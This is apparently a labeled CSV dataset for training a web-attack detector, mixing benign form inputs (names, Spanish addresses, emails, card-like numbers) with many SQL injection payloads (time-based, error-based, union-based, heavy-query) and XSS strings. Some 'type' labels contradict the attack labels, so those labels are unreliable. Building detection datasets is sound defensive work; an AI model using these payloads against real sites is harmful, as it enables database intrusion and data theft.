Text,attack_type,Label,type
1'+(select mavu where 4276=4276 rlike sleep(5)#,sqli,1,sql
odiosid-ad,norm,0,normal
dec4mas8xt6,norm,0,normal
81667398x,norm,0,normal
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('yqzg'='yqzg",sqli,1,sql
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",sqli,1,sql
"1'||(select 'kyhs' from dual where 9491=9491;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
tunaroza capmany,norm,0,normal
"1"")) as szxa where 1501=1501 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
jess,norm,0,normal
"c/ alcaices, 23",norm,0,normal
dyck,norm,0,normal
adapuesto,norm,0,normal
<script>document.cookie=true;//--></script>,xss,2,xss
1))) union all select null--,sqli,1,sql
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""uidb"" like ""uidb",sqli,1,sql
5a68i5ru9i2,norm,0,normal
6764,norm,0,normal
"1'||(select 'votg' where 5105=5105 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1'||(select 'kptj' from dual where 5123=5123;select (case when (8362=7572) then 8362 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
ballou@adondeir.mn,norm,0,normal
"1'))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
1%')));begin user_lock.sleep(5); end and ((('%'=',sqli,1,sql
7676907583941560,norm,0,normal
4077,norm,0,normal
velen,norm,0,normal
"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">",xss,2,xss
"1"") where 1410=1410;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
6974700055894599,norm,0,normal
"mesas, las",norm,0,normal
colmada43n24,norm,0,normal
barron,norm,0,normal
-8057')) as gpue where 4205=4205 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
armenteros,norm,0,normal
baheya,norm,0,normal
coomonte,norm,0,normal
hoyt,norm,0,normal
63395358k,norm,0,normal
8961981301450385,norm,0,normal
santini_baretto@zarahealth.bm,norm,0,normal
<body onload=alert('xss')>,xss,2,xss
1'));(select * from (select(sleep(5)))srmq) and (('stea'='stea,sqli,1,sql
z5r1174osa,norm,0,normal
sureda fuertes,norm,0,normal
1')) as qovd where 8865=8865 and (3020=3020)*6703--,sqli,1,sql
aguarn,norm,0,normal
"1"")) as vxkn where 2443=2443 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
31790,norm,0,normal
"-2582'+(select ggim where 5346=5346 union all select 5346,5346#",sqli,1,sql
"arosa, 117 8?f",norm,0,normal
calle martin arredondo 31 9g,norm,0,normal
"asuncion castell, 17",norm,0,normal
"1' (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",sqli,1,sql
"-9924)) as zgqa where 2867=2867 union all select 2867,2867,2867,2867,2867,2867,2867,2867,2867,2867#",sqli,1,sql
cruz,norm,0,normal
foa@mcrspain.lr,norm,0,normal
calderer ares,norm,0,normal
1%')) or (select * from (select(sleep(5)))ydpu) and (('%'=',sqli,1,sql
"<input type=""image"" id=xss src=""javascript:alert('xss');"">",xss,2,xss
0113026243246153,norm,0,normal
stastny,norm,0,normal
wildt_feng-chiao@paseotuperro.ke,norm,0,normal
castro de rei,norm,0,normal
9554640279631297,norm,0,normal
60106679c,norm,0,normal
35868151l,norm,0,normal
hilaria,norm,0,normal
6865,norm,0,normal
butalov0@lettere.dm,norm,0,normal
flota5iento,norm,0,normal
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'nwdk' like 'nwdk",sqli,1,sql
montamarta,norm,0,normal
manica,norm,0,normal
olalla,norm,0,normal
1'+(select 'vidl' where 9445=9445 and 5498=5777#,sqli,1,sql
4138413338105604,norm,0,normal
2epullo,norm,0,normal
kyle@psykoterapeut.tv,norm,0,normal
saltigallo,norm,0,normal
1%') or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
4l09o636a,norm,0,normal
"cabrera, 199",norm,0,normal
"-2570"" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""dmch"" like ""dmch",sqli,1,sql
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
44ap25a,norm,0,normal
sagarda,norm,0,normal
biota,norm,0,normal
arguis,norm,0,normal
-4538'))) or 3260=1236 and ((('hpnd' like 'hpnd,sqli,1,normal
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('wnzv'='wnzv",sqli,1,sql
membrilla,norm,0,normal
honduras 105,norm,0,normal
02249,norm,0,normal
1) rlike (select * from (select(sleep(5)))sgvo) and (4968=4968,sqli,1,sql
8474675220591045,norm,0,normal
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('dsok'='dsok",sqli,1,sql
7714584958323378,norm,0,normal
"1"")) as dcrk where 5164=5164 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
88102583w,norm,0,normal
flor chino,norm,0,normal
"c/ salvador 64, 5c",norm,0,normal
"1'+(select hrgu where 9587=9587;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))+'",sqli,1,sql
0432799934318688,norm,0,normal
tarasca,norm,0,normal
09135,norm,0,normal
1))) or sleep(5)#,sqli,1,normal
1862612098499070,norm,0,normal
montfort fiuza,norm,0,normal
pinofranqueado,norm,0,normal
open()>,xss,2,normal
"-5150))) union all select 5660,5660,5660#",sqli,1,sql
94987112x,norm,0,normal
carbajosa de la sagrada,norm,0,normal
venancia,norm,0,normal
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",sqli,1,sql
1') as xiqw where 8507=8507 rlike sleep(5)--,sqli,1,sql
376gstu90,norm,0,normal
"-5624' union all select 3723,3723,3723,3723,3723--",sqli,1,sql
3sc8r4a8anada,norm,0,normal
98810075m,norm,0,normal
torrelavega,norm,0,normal
cluet higuerue,norm,0,normal
1%';waitfor delay '0:0:5' and '%'=',sqli,1,sql
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",sqli,1,sql
87058281s,norm,0,normal
50757533y,norm,0,normal
"-8982' in boolean mode) union all select 5367,5367,5367,5367,5367,5367#",sqli,1,sql
77603o8ada,norm,0,normal
montoro,norm,0,normal
52438346w,norm,0,normal
"1' and 3824=benchmark(5000000,md5(0x76555642))",sqli,1,normal
"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'fsvr'='fsvr",sqli,1,sql
26143,norm,0,normal
"travesia del mercado, s/n,",norm,0,normal
3632,norm,0,normal
1%')));select case when 7717=7717 then 1 else null end--,sqli,1,sql
goyenaga,norm,0,normal
20741927k,norm,0,normal
santa cruz de la zarza,norm,0,normal
"1""))) order by 1--",sqli,1,sql
robina,norm,0,normal
"c/ vallcorba 152, 7?f",norm,0,normal
"1 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# msrb",sqli,1,sql
pallen,norm,0,normal
"pasaje arquitecto gaudi 85,",norm,0,normal
"c/ francisco de ricci 23, 1?c",norm,0,normal
namkoong@quadernideilgarda.no,norm,0,normal
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1006455310670976,norm,0,normal
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('tetk'='tetk",sqli,1,sql
equilibrio,norm,0,normal
"-9959"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""vcwc""=""vcwc",sqli,1,sql
sambumbia,norm,0,normal
"1"") and 6969=(select 6969 from pg_sleep(5)) and (""cjkk"" like ""cjkk",sqli,1,sql
28189,norm,0,normal
"-6656"") union all select 3931#",sqli,1,sql
pelez bastus,norm,0,normal
-1765') order by 1--,sqli,1,sql
laplat@granadapromueve.cx,norm,0,normal
"c/ rio avia, 105, 2?h",norm,0,normal
0iri1a33,norm,0,normal
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",sqli,1,sql
portillo de toledo,norm,0,normal
"camino cementerio, s/n,",norm,0,normal
de$lictivo,norm,0,normal
sprayber,norm,0,normal
botarell,norm,0,normal
saskia,norm,0,normal
2144,norm,0,normal
"-5124'+(select 'xpww' where 1752=1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--",sqli,1,sql
3733,norm,0,normal
"1' where 4945=4945;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
c/ hermanos pinzon 178,norm,0,normal
ajaraca,norm,0,normal
basileo,norm,0,normal
e517a$d7,norm,0,normal
64139121x,norm,0,normal
"1')) as bsvk where 5985=5985 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
wendell@somosagelespaa.ml,norm,0,normal
3307,norm,0,normal
"-9122) as sdlg where 1546=1546 union all select 1546,1546,1546,1546,1546,1546,1546--",sqli,1,sql
"c/ periodista jose luis de cordoba, 16",norm,0,normal
91328189l,norm,0,normal
pisani,norm,0,normal
azarosa,norm,0,normal
98585223r,norm,0,normal
"1' where 7504=7504 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
46922349a,norm,0,normal
lupien,norm,0,normal
"1) where 5651=5651;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
d2sa2uer5o,norm,0,normal
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",sqli,1,sql
alhama de granada,norm,0,normal
tijerin monaghan,norm,0,normal
"1) where 7748=7748 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga",sqli,1,sql
26241,norm,0,normal
7951593634712530,norm,0,normal
"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",sqli,1,sql
zapateo,norm,0,normal
"1',(select (case when (4209=5879) then 1 else 4209*(select 4209 from information_schema.character_sets) end))",sqli,1,sql
39738,norm,0,normal
dillard,norm,0,normal
"jana, la",norm,0,normal
johann,norm,0,normal
"1"" where 5039=5039 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1' where 4880=4880 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
35866862h,norm,0,normal
raimund,norm,0,normal
"-7248') where 4626=4626 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
thies,norm,0,normal
stief.kenworthy@todomodelos.edu,norm,0,normal
"-1684""))) union all select 7473,7473#",sqli,1,sql
ramells lam,norm,0,normal
"plza. jose palmis 179,",norm,0,normal
bendixsen9@foreignoffice.ps,norm,0,normal
lantz,norm,0,normal
3278824156845897,norm,0,normal
1) and 6969=(select 6969 from pg_sleep(5)) and (9505=9505,sqli,1,sql
"-8454"" or 6872=6872",sqli,1,normal
16851,norm,0,normal
yn,norm,0,normal
"1"") and 8407=(select count(*) from generate_series(1,5000000)) and (""wmmg"" like ""wmmg",sqli,1,sql
1') as tqdg where 9355=9355;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
48381,norm,0,normal
6172398321911966,norm,0,normal
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",sqli,1,sql
46724,norm,0,normal
8029,norm,0,normal
90946866j,norm,0,normal
"<xml id=i><x><c><![cdata[<img id=xss src=""javas]]<![cdata[cript:alert('xss');"">]]</c><x></xml>",xss,2,sql
mcconnel,norm,0,normal
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",sqli,1,sql
"calle miguel lopez de legazpi, 48, 8f",norm,0,normal
"1"") where 2367=2367;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"1%""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""%""=""",sqli,1,sql
"<div datafld=""b"" dataformatas=""html"" dataid=xss src=""#xss""></div>",xss,2,normal
villalba de los alcores,norm,0,normal
1' rlike (select * from (select(sleep(5)))sgvo) and 'mabd'='mabd,sqli,1,sql
arrebatarse,norm,0,normal
chopel@restauranteslaespadaa.bg,norm,0,normal
0552871486458535,norm,0,normal
"1""))) and sleep(5) and (((""bvgg""=""bvgg",sqli,1,normal
willetta,norm,0,normal
trixie,norm,0,normal
1 and (select * from (select(sleep(5)))fzno),sqli,1,sql
"1%"")) union all select null,null,null,null,null--",sqli,1,sql
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
gault-lovett@lunch.com.ga,norm,0,normal
embo4ina80,norm,0,normal
-1459'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('eiet' like 'eiet,sqli,1,sql
winstanley@waterflyesp.hn,norm,0,normal
1)) as qlkf where 6635=6635;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
9365263775235809,norm,0,normal
"plaza fontana, 78,",norm,0,normal
"(select like('abcdefg',upper(hex(randomblob(500000000/2)))))",sqli,1,sql
"-5957))) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--",sqli,1,sql
faja de la sierra,norm,0,normal
peraferr,norm,0,normal
2545616018794952,norm,0,normal
walliw,norm,0,normal
<img src=javascript:alert('crosssitescripting')>,xss,2,xss
sutphen,norm,0,normal
ladra belonne,norm,0,normal
14973109v,norm,0,normal
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
8015,norm,0,normal
corb9ch4da,norm,0,normal
amarjit,norm,0,normal
-1<body onload=document.cookie=true;>,xss,2,xss
"-4699) as mymz where 3405=3405 or elt(1032=1032,3623)--",sqli,1,sql
"castillo de segura de leon, 56, 10?c",norm,0,normal
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
rebalg1r,norm,0,normal
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",sqli,1,sql
"1'||(select 'lije' from dual where 5309=5309 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,sql
-2960' or 2163=3143--,sqli,1,sql
noblejas,norm,0,normal
garladora,norm,0,normal
78590398l,norm,0,normal
1)));select pg_sleep(5)--,sqli,1,sql
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
1') where 3636=3636 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
zaquiel,norm,0,normal
-7209'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('stqx'='stqx,sqli,1,sql
"-2001'+(select 'nput' where 8368=8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",sqli,1,sql
25585710g,norm,0,normal
9568195762432395,norm,0,normal
"1%"")) or (select * from (select(sleep(5)))ydpu) and ((""%""=""",sqli,1,sql
"1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
"1%"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""%""=""",sqli,1,normal
fructferamente,norm,0,normal
</body></html>,xss,2,normal
"1"")) as qrok where 8257=8257 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
21410,norm,0,normal
2am901to,norm,0,normal
gaile,norm,0,normal
4890165807728190,norm,0,normal
"1%"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""%""=""",sqli,1,sql
almeida de sayago,norm,0,normal
"-4091""))) union all select 6694,6694--",sqli,1,sql
10161,norm,0,normal
"-8007' where 9649=9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",sqli,1,sql
"1) as idvt where 3490=3490 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1"")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""jcyh""=""jcyh",sqli,1,sql
dolores,norm,0,normal
expol566!57a,norm,0,normal
almendros,norm,0,normal
el taxista 199 10?c,norm,0,normal
9695488884758445,norm,0,normal
1' in boolean mode);begin user_lock.sleep(5); end--,sqli,1,sql
02056001p,norm,0,normal
1')) order by 1--,sqli,1,sql
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('zpzf'='zpzf",sqli,1,sql
"-6611%""))) union all select 8918,8918#",sqli,1,sql
05147,norm,0,normal
"1"")) as brwj where 9180=9180;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"1%"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (""%""=""",sqli,1,sql
"-7350'))) union all select 9207,9207,9207,9207--",sqli,1,sql
68133766s,norm,0,normal
diy$ambo,norm,0,normal
mo3e5e5o,norm,0,normal
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",sqli,1,normal
nurit,norm,0,normal
1' and sleep(5) and 'pfgy'='pfgy,sqli,1,normal
"1"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""tjbe"" like ""tjbe",sqli,1,sql
"1"") where 9461=9461 union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
crmenes,norm,0,normal
6054,norm,0,normal
san bartolom de las abiertas,norm,0,normal
8045891356356688,norm,0,normal
2567,norm,0,normal
"1"")) as rfgu where 4880=4880 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
m01vi3,norm,0,normal
43425,norm,0,normal
"1')) as jpxj where 6153=6153 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
02311,norm,0,normal
extremosa,norm,0,normal
"-2889)) as iqzv where 1786=1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",sqli,1,sql
vivencio,norm,0,normal
adirano,norm,0,normal
38435,norm,0,normal
-1579%'))) union all select 7272#,sqli,1,sql
cornisamen!to,norm,0,normal
padmanab,norm,0,normal
1')) as cyom where 2318=2318 and 7533=7533--,sqli,1,sql
2904435475269669,norm,0,normal
particular basterra 108,norm,0,normal
"1"") and 8677=9054#",sqli,1,normal
woolgar@awat.gov,norm,0,normal
ilya,norm,0,normal
canje,norm,0,normal
69082096d,norm,0,normal
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",sqli,1,sql
1')));select pg_sleep(5) and ((('mgbm' like 'mgbm,sqli,1,sql
"-8893%')) or elt(1032=1032,3623) and (('%'='",sqli,1,normal
7537,norm,0,normal
9ot87ico,norm,0,normal
1) as mtnw where 7293=7293 and 2603=5764--,sqli,1,sql
pl. torres de omaa 123 6-f,norm,0,normal
randall,norm,0,normal
6435,norm,0,normal
<img id=xss src=&{alert('xss');};>,xss,2,sql
08470,norm,0,normal
39638,norm,0,normal
1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj,sqli,1,sql
9398,norm,0,normal
"ronda sant antoni maria claret 144,",norm,0,normal
8ienne2s6,norm,0,normal
842is2n,norm,0,normal
cerd24a,norm,0,normal
"urbanitzacio europa-fuentes de san bernabe s/n,",norm,0,normal
"avinguda guix borrull 170,",norm,0,normal
"calle hemingway, s/n",norm,0,normal
2563,norm,0,normal
28737,norm,0,normal
calle juan agui 97 9-e,norm,0,normal
"-1678"" where 3706=3706 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"<table><td background=""javascript:alert('xss')"">""",xss,2,xss
entrepalmadura,norm,0,normal
"1))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((2230=2230",sqli,1,sql
"1))) or elt(6272=6272,sleep(5)) and (((9558=9558",sqli,1,normal
galvao_pesche@ajuntamentbarcelona20.ky,norm,0,normal
gldar,norm,0,normal
salhany0,norm,0,normal
3243,norm,0,normal
"-2364'+(select 'qdut' where 7560=7560 union all select 7560,7560,7560,7560,7560--",sqli,1,sql
81621470j,norm,0,normal
"calle titania 45, 5d",norm,0,normal
heldabrand5@chevrolet-volt.bg,norm,0,normal
42,norm,0,normal
"1')) as umah where 3781=3781 union all select null,null,null,null#",sqli,1,sql
1)) and 9198=9198--,sqli,1,sql
22639557j,norm,0,normal
70489976j,norm,0,normal
"1' where 2123=2123 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
5986,norm,0,normal
"1"")) as hkrh where 3060=3060 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
moneder-a,norm,0,normal
padraic,norm,0,normal
"1"")) and 2006=2006",sqli,1,normal
detleff3,norm,0,normal
64179446q,norm,0,normal
62364423s,norm,0,normal
tamura,norm,0,normal
"1') or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ('blnh' like 'blnh",sqli,1,sql
a4561o9nz68,norm,0,normal
6144624878722444,norm,0,normal
ginest baquedano,norm,0,normal
1ojador,norm,0,normal
1);begin user_lock.sleep(5); end and (4610=4610,sqli,1,sql
"1')) union all select null,null,null,null--",sqli,1,sql
aldea del fresno,norm,0,normal
4231744159905009,norm,0,normal
"1') as fyuh where 7608=7608 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
3064,norm,0,normal
"calle rascafria, 103,",norm,0,normal
14412,norm,0,normal
undulatori_a,norm,0,normal
"calle salvatierra 196,",norm,0,normal
randy,norm,0,normal
9161686921830219,norm,0,normal
reele.cto,norm,0,normal
plza. padre juan de mariana 152,norm,0,normal
"1"") where 3058=3058 union all select null--",sqli,1,sql
muntaner nevado,norm,0,normal
ghossein,norm,0,normal
eugen-fargue@andrestabernero.im,norm,0,normal
lorber-albasiny@cortinasartesol.pa,norm,0,normal
"1"") where 8196=8196;iif(2840=3788,1,1/0)",sqli,1,sql
"1"";(select * from (select(sleep(5)))srmq) and ""plqe""=""plqe",sqli,1,sql
1%';if(6842=5446) select 6842 else drop function vjfq--,sqli,1,sql
60537126e,norm,0,normal
"1))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%"") or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-9015%"") union all select 6948,6948--",sqli,1,sql
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""yxpo"" like ""yxpo",sqli,1,sql
"1'+(select 'mikf' where 5814=5814 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
szarabajka@queinvento.si,norm,0,normal
8533,norm,0,normal
03812,norm,0,normal
"1'))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((('dzzx'='dzzx",sqli,1,normal
liduea mediero,norm,0,normal
"-8791""))) or make_set(6681=6620,6620) and (((""pvdk""=""pvdk",sqli,1,normal
anselmo,norm,0,normal
sadegh,norm,0,normal
1) as iiku where 9466=9466;select (case when (5847=2826) then 5847 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
drop-box,norm,0,sql
cu25439y,norm,0,normal
4381135407580429,norm,0,normal
almfar,norm,0,normal
"1') where 1600=1600 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1'));select (case when (6615=3564) then 1 else 6615*(select 6615 from master..sysdatabases) end)--,sqli,1,sql
c1s92be4e29,norm,0,normal
newlinsky@forohh.et,norm,0,normal
"1"" where 9173=9173 rlike (select (case when (7689=7689) then 1 else 0x28 end))--",sqli,1,sql
"-3829%"") union all select 2218,2218,2218,2218,2218,2218,2218--",sqli,1,sql
"glorieta puerta de hierro, 57",norm,0,normal
quan@arroyo-molinos.ee,norm,0,normal
